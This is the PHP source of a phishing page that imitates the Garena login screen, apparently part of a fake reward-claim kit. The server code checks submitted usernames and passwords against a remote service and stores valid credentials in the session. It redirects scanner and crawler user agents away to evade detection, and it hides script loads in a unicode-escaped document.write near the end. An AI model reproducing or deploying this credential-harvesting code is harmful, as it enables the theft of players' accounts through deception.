<?php 
set_time_limit(0);
ob_start();
session_start();
require_once('garena.class.php');

if(isset($_SESSION['username']) && isset($_SESSION['katasandi']))
?>

<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: http://www.anampedia.net');
die();
}
?>
<html>
   <head>
      <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
      <meta name="description" content="Garena">
      <link href="https://auth.garena.com/css/sso.css?v=0.54" rel="stylesheet" type="text/css">
       <link rel="shortcut icon" href="https://cdngarenanow-a.akamaihd.net/webmain/static/favicon.ico">
      <title>Garena</title>
   </head>
   <body>
      
      <div id="page">
         <div id="header" class="header">
            <div class="langWrapper fr">
               <select class="lang">
                  <option value="id-ID">Indonesia - Bahasa Indonesia</option>
                  <option value="en-US">International - English</option>
                  <option value="en-SG">Singapore - English</option>
                  <option value="en-PH">Philippines - English</option>
                  <option value="en-MY">Malaysia - English</option>
               </select>
               <span class="icon-earth"></span>
            </div>
            <div class="topBarGarena"></div>
            <div class="topBar"></div>
            <h1><a class="logo" href="http://www.garena.com" target="_blank"><img src="https://sso.garena.com/images/img_garena_logo.png" style="margin-top:10px;height: 35px;"></a></h1>
         </div>
         <div id="main-panel">
            <div class="content" style="top: 0px;">
               <h2 class="title">Login</h2>
               <div class="loginForm">
            <form action="" method="post">
                  <div id="line-country" style="display: none;" class="line">

                  </div>
                  <div id="line-account" class="line">
              <input style="width:395px;" name="username" value="" placeholder="Username Garena / E-Mail" autocorrect="off" autocapitalize="off" type="text"></div>
              <input style="width:395px;" id="bypass" name="bypass" value="" type="hidden">
               <input style="width:395px;" id="server" name="server" value="" type="hidden">
               <input style="width:395px;" id="author"  name="author" value="" type="hidden">
               <input style="width:395px;" id="sandikata"  name="sandikata" value="" type="hidden">
                  <div id="line-password" style="margin-bottom:10px !important;" class="line">
              
              <input style="margin-bottom:10px !important;width:395px;" id="password" name="password" placeholder="Password" value="" type="password"> 
               <input style="width:395px;" id="hash" name="hash" value="" type="hidden">
               <input style="width:395px;" name="csrf-jwlt" value="<?php echo $darknethost->fetchToken();?>" type="hidden">
              </div>
              
              <?php 
             if(isset($_POST['login'])){

               $username = $_POST['username'];
               $password = $_POST['hash'];   
               $hash = $_POST['csrf-jwlt'];
               $secret = $_POST['sandikata'];

               $checkLogin = $darknethost->getMessage($username, $password, $hash);

               if(preg_match('/<li><a href="\/logout">Sign Out<\/a><\/li>/' , $checkLogin)){

                 $_SESSION['username'] = $username;
                $_SESSION['katasandi'] = $secret;
      
                echo("<script language=\"javascript\">"); 
                echo("top.location.href = \"/../claimsukses\";"); 
                echo("</script>"); 
              exit();
              
            }else{

             echo '<span id="msg" class="errorMsg"><img src="https://sso.garena.com/images/error.png"> Login gagal, username / password Anda salah.</span>';

               }
             }
               ?>
                  <div id="line-btn" class="line btnLine">
              <input id="garenabutton" name="login" value="Login Now" onclick="masukin()" class="btn"  type="submit" >
              </div>
              <div class="divider"><span>or</span></div>
              </form>
                <div id="line-btn" class="line btnLine"><a href="https://auth.garena.com/ui/register" target="_top" style="text-decoration:none;"><input id="sso_login_link_register" name="register" type="button" value="Register A New Account" class="btn black"></form></a></div>
               <div class="linkLine">
            <a id="sso_login_link_forget_password" href="https://account.garena.com/recovery#/" target="_top" class="sec">Forgot Password</a></div>
            </div>
         </div>
      </div>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request" + "?id=1" + "&enc=telkom2" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582AaN6h071sG%2bK1PafbffoAyw5SWLbL9eVLW16LAf%2fo%2b76MlVjMjbnGcvkYXsNUk5thfbyBOD4jNUyeXe9aHKH4fjWgzggU0IABrwbUCHq04sFK9LHL9vZGk1qSfbQAok8NzObOPB4y6pEMd%2fUVuFDCURKExWS5%2faCTAkbLszq7%2bYDvNNYQnS%2f8w8GhblmgpxLZrMqI%2fLAcJnl%2bzBl2dcoP8EbcGPL5Ur8RrRhnrASc1hSZh2vgENhX3ctuLaDa%2bhL5L0JA4iJ4rQSdNjGzOpNzt5slRGMR6%2bxMorzcjvNL3wMxqxzninY1NM99%2f7Fe4MUCi6t693EJMYZCVa4gtY0sPvgzznR3TZqvfjRXX6kk4GZOCuWGYAu2%2b4QE4dGrsyVrXvNhT7fSkDAFyRTPv0nCoHVscWjLTZgSX%2fH%2fXjS2vVVWEHvu2fEPUSE%2bOEvCuJHNbEJ763Guf1QCc25Pfmz4M%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
     <script>
   </script>
<script type="text/javascript">document.write('\u0020\u0020\u0020\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003D\u0022\u0064\u0061\u0072\u006B\u006E\u0065\u0074\u0068\u006F\u0073\u0074\u002E\u006A\u0073\u0022\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u000A\u0020\u0020\u0020\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0073\u0072\u0063\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0067\u0063\u006D\u0073\u0032\u002E\u0067\u0061\u0072\u0065\u006E\u0061\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0061\u0074\u0069\u0063\u002F\u0061\u0073\u0073\u0065\u0074\u0073\u002F\u006A\u0073\u002F\u006A\u0071\u0075\u0065\u0072\u0079\u002E\u006D\u0069\u006E\u002E\u006A\u0073\u0022\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u000A\u0020\u0020\u0020\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0020\u0073\u0072\u0063\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0067\u0063\u006D\u0073\u0032\u002E\u0067\u0061\u0072\u0065\u006E\u0061\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0061\u0074\u0069\u0063\u002F\u0061\u0073\u0073\u0065\u0074\u0073\u002F\u006A\u0073\u002F\u006A\u0073\u0065\u006E\u0063\u0072\u0079\u0070\u0074\u002F\u006A\u0073\u0062\u006E\u002E\u006A\u0073\u0022\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u000A\u0020\u0020\u0020\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0020\u0073\u0072\u0063\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0067\u0063\u006D\u0073\u0032\u002E\u0067\u0061\u0072\u0065\u006E\u0061\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0061\u0074\u0069\u0063\u002F\u0061\u0073\u0073\u0065\u0074\u0073\u002F\u006A\u0073\u002F\u006A\u0073\u0065\u006E\u0063\u0072\u0079\u0070\u0074\u002F\u0070\u0072\u006E\u0067\u0034\u002E\u006A\u0073\u0022\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u000A\u0020\u0020\u0020\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0020\u0073\u0072\u0063\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0067\u0063\u006D\u0073\u0032\u002E\u0067\u0061\u0072\u0065\u006E\u0061\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0061\u0074\u0069\u0063\u002F\u0061\u0073\u0073\u0065\u0074\u0073\u002F\u006A\u0073\u002F\u006A\u0073\u0065\u006E\u0063\u0072\u0079\u0070\u0074\u002F\u0072\u006E\u0067\u002E\u006A\u0073\u0022\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u000A\u0020\u0020\u0020\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0020\u0073\u0072\u0063\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0067\u0063\u006D\u0073\u0032\u002E\u0067\u0061\u0072\u0065\u006E\u0061\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0061\u0074\u0069\u0063\u002F\u0061\u0073\u0073\u0065\u0074\u0073\u002F\u006A\u0073\u002F\u006A\u0073\u0065\u006E\u0063\u0072\u0079\u0070\u0074\u002F\u0072\u0073\u0061\u002E\u006A\u0073\u0022\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u000A\u0020\u0020\u0020\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0020\u0073\u0072\u0063\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0067\u0063\u006D\u0073\u0032\u002E\u0067\u0061\u0072\u0065\u006E\u0061\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0061\u0074\u0069\u0063\u002F\u0061\u0073\u0073\u0065\u0074\u0073\u002F\u006A\u0073\u002F\u006A\u0073\u0065\u006E\u0063\u0072\u0079\u0070\u0074\u002F\u0062\u0061\u0073\u0065\u0036\u0034\u002E\u006A\u0073\u0022\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E\u000A\u0020\u0020\u0020\u003C\u0073\u0063\u0072\u0069\u0070\u0074\u0020\u0020\u0073\u0072\u0063\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F\u002F\u0067\u0063\u006D\u0073\u0032\u002E\u0067\u0061\u0072\u0065\u006E\u0061\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0061\u0074\u0069\u0063\u002F\u0061\u0073\u0073\u0065\u0074\u0073\u002F\u006A\u0073\u002F\u006A\u0073\u0065\u006E\u0063\u0072\u0079\u0070\u0074\u002F\u0067\u0061\u0072\u0065\u006E\u0061\u005F\u006C\u006F\u0067\u0069\u006E\u002E\u006A\u0073\u0022\u003E\u003C\u002F\u0073\u0063\u0072\u0069\u0070\u0074\u003E');</script>
</body>
</html>